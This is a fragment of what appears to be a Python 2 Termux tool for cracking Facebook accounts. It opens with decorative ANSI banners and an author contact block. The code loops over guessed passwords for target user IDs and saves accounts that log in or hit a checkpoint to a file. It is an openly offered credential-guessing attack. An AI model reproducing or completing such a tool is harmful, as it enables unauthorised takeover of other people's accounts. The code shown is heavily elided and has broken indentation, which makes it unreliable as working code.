...
\033[1;96m        █▀▄ ▀█▀ █░░ █░░ █▀▀ █▄▄▀
\033[1;95m        ▀░▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀░▀▀
\033[1;95m __    ____  ____  _  _   __    _  _    
\033[1;95m /__\  (  _ \(_  _)( \/ ) /__\  ( \( )
 \033[1;95m /(__)\  )   / _)(_  \  / /(__)\  )  (
 \033[1;95m(__)(__)(_)\_)(____) (__)(__)(__)(_)\_)
*_ꙮ⃢▄▆▇█�⃢✿⁍⃢🇪⃢⁌✿⃢��⃢✿⁍⃢🇪⃢⁌✿⃢��⃢✿⁍⃢🇪⃢⁌✿⃢�⃢✿⁍⃢🇪⃢⁌✿⃢��█▇▆▄⃢ꙮ_*
\033[1;91m●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●
\033[1;92m●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●
\033[1;93m●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●
...
"""
logo2 = """
\x1b[1;92m➣ NAME :           💗 ARIYAN MAGIBAG 💗
\x1b[1;91m➣ PGE NAME :  💣TERMUX MAGIBAG ARIYAN💣
\x1b[1;93m➣ WHATSAPP NO :   👬 +8801706200853 👬
...
def action():
	...
	if ahmad =='':
		...
		os.system('xdg-open https://youtube.com/channel/UCIV6WyT7NYuNTdMoVduGfYwl')
		login()
	elif ahmad =='0':
		exb()
	else:
		...
		try:
			...
			if 'access_token' in q:
				...
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;96m[Ariyan-X-Ok] ' + k + c + user + '  》  ' + pass1+'\n'
					...
					cpb.append(c+user+pass1)
 				    ...
 				    if 'access_token' in q:
 				        ...
 				        if 'www.facebook.com' in q['error_msg']:
 					        print '\033[1;96m[Ok] ' + k + c + user + '  》  ' + pass2+'\n'
 					        cps = open('save/checkpoint.txt', 'a')
 				            ...
 				            if 'access_token' in q:
 				                ...
 				                if 'www.facebook.com' in q['error_msg']:
 					                print '\033[1;96m[ok] ' + k + c + user + '  》  ' + pass3+'\n'
 					                cps = open('save/checkpoint.txt', 'a')
 				                    ...
 				                    if 'access_token' in q:
 				                        ...
 				                        if 'www.facebook.com' in q['error_msg']:
 					                        print '\033[1;96m[ok] ' + k + c + user + '  》  ' + pass4+'\n'
 					                        cps = open('save/checkpoint.txt', 'a')
